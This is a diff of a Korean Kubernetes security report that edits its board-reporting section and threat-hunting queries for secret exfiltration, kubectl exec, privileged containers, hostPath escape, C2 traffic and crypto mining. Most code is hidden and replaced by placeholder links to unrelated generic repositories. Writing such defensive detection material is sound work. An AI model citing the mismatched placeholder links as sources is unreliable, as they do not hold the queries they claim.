 ### 8.5 실무 권장사항 (한국 조직 대상)
@@ -374,7 +1028,7 @@ Jamf Threat Labs의 분석에 따르면, 공격자들이 Microsoft Visual Studio
 
 ## 9. 경영진 보고 형식 (Board Reporting Format)
 
-### 9.1 경영진 요약 (1페이지)
+### 9.1 Executive Summary (1-Page)
 
 **보고 일자**: 2026년 1월 22일
 **보고 대상**: CISO, CTO, 이사회
@@ -412,24 +1066,17 @@ Jamf Threat Labs의 분석에 따르면, 공격자들이 Microsoft Visual Studio
 
 ### 9.2 리스크 매트릭스 (시각화)
 
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
 > 
 > ```
 > Impact...
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
 > 
 > ```
 > Impact...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
-> 
-> ```
-> Impact [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -449,7 +1096,6 @@ LOW │                        [GPU 낭비]
 
 
 ```
--->
 -->
 -->
 
@@ -478,13 +1124,6 @@ LOW │                        [GPU 낭비]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
-> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
-> ```
-> Q1 2026 (Jan - Mar) [truncated]
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
 ```
 Q1 2026 (Jan - Mar)
 ├─ Week 1-2: Net-NTLMv1 환경 감사 완료
@@ -506,9 +1145,8 @@ Q3 2026 (Jul - Sep)
 ```
 -->
 -->
--->
 
-### 9.5 KPI (핵심 성과 지표)
+### 9.5 KPI (Key Performance Indicators)
 
 | KPI | 현재 (Baseline) | Q2 2026 목표 | Q4 2026 목표 |
 |-----|----------------|-------------|-------------|
@@ -527,7 +1165,6 @@ Q3 2026 (Jul - Sep)
 
 #### Query 1: 비정상 시간대 클러스터 접근
 
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
@@ -550,7 +1187,6 @@ KubeAuditEvents
 ```
 -->
 -->
--->
 
 #### Query 2: Secrets 대량 접근 (데이터 유출 전조)
 
@@ -565,13 +1201,6 @@ KubeAuditEvents
 > 
 > ```spl
 > # Splunk SPL...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
-> ```spl
-> # Splunk SPL [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -593,7 +1222,6 @@ index=k8s sourcetype=kube:audit
 ```
 -->
 -->
--->
 
 #### Query 3: 의심스러운 kubectl exec 사용
 
@@ -608,13 +1236,6 @@ index=k8s sourcetype=kube:audit
 > 
 > ```yaml
 > # Falco Rule (Kubernetes Runtime Security)...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
-> ```yaml
-> # Falco Rule (Kubernetes Runtime Security) [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -638,13 +1259,10 @@ index=k8s sourcetype=kube:audit
 ```
 -->
 -->
--->
 
 ### 10.2 컨테이너 런타임 이상 행위 탐지
 
 #### Query 4: 특권 컨테이너 생성 추적
-
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
@@ -662,24 +1280,17 @@ index=k8s sourcetype=kube:audit
 
 #### Query 5: hostPath 볼륨 마운트 탐지 (컨테이너 이스케이프 위험)
 
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
 > 
 > ```kql
 > // Azure Sentinel KQL...
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
 > 
 > ```kql
 > // Azure Sentinel KQL...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **참고**: 관련 예제는 [공식 문서](https://docs.docker.com/) 및 [GitHub 예제](https://github.com/docker/awesome-compose)를 참조하세요.
-> 
-> ```kql
-> // Azure Sentinel KQL [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -703,13 +1314,10 @@ KubeAuditEvents
 ```
 -->
 -->
--->
 
 ### 10.3 네트워크 이상 징후 탐지
 
 #### Query 6: 비정상 아웃바운드 트래픽 (C2 통신 가능성)
-
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
@@ -729,7 +1337,6 @@ index=k8s_network OR index=firewall
 
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
 // Azure Sentinel KQL
 KubeAuditEvents
@@ -745,7 +1352,6 @@ KubeAuditEvents
 
 
 ```
--->
 -->
 -->
 
@@ -764,13 +1370,6 @@ KubeAuditEvents
 > 
 > ```python
 > # Prometheus PromQL → Python 분석 스크립트...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
-> ```python
-> # Prometheus PromQL → Python 분석 스크립트 [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -809,7 +1408,6 @@ def detect_crypto_mining():
 ```
 -->
 -->
--->
 
 ### 10.5 헌팅 워크플로 자동화
 
@@ -826,13 +1424,6 @@ def detect_crypto_mining():
 > 
 > ```yaml
 > # Azure Sentinel Analytics Rule...
-> ```
-
-<!-- 전체 코드는 위 GitHub 링크 참조
-> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
-> ```yaml
-> # Azure Sentinel Analytics Rule [truncated]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -863,7 +1454,6 @@ query: |
 
 
 ```
--->
 -->
 -->
 
